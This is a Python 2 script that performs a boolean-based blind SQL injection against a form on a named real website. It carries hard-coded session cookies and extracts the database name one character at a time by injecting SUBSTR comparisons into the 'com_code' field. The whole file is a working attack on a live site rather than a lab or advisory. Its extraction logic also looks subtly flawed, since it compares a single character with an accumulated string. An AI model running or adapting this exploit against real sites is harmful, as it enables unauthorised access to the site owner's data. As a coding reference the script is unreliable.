import requests

charset = "_0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz"

url='https://vietequity.com/tu-van-tu-dong'
cookie={"PHPSESSID":"a66cec4c4a184cf60deebf505a8e6a37", "_ga":"GA1.2.1515703164.1499215831", "_gid":"GA1.2.845722171.1499215831", "__zlcmid":"hMgZVGSjSulC8J", "PHPSESSID":"a66cec4c4a184cf60deebf505a8e6a37", "_gat":"1"}
data={}
data['quarter']='01'
data['year']='2017'
data['submit']="Submit"

payload = """fpt' and if(substr((SELECT DATABASE() FROM DUAL),%i,1)="%s",1,0)-- -"""
index = 1
flag = ""
lol = "ZmEtYXJyb3dzLWglMjIlM0UlM0MlMkZpJTNFJTIwMCUyQzAlMjAoMCUyQzAlMjUpJTNDJTJGZm9u\ndCUzRSUzQ3NwYW4lMjBsYWJlbCUzRCUyMmZvbnQtd2VpZ2h0"
for i in range(len(charset)):
	data['com_code'] = payload % (index, flag + charset[i])
	r = requests.post(url, cookies=cookie, data=data)
	print len(r.text)
	if lol.decode("base64") in r.text:
		print charset[i], "fail"
	else:
		index+= 1
		flag+= charset[i]
	print flag

		


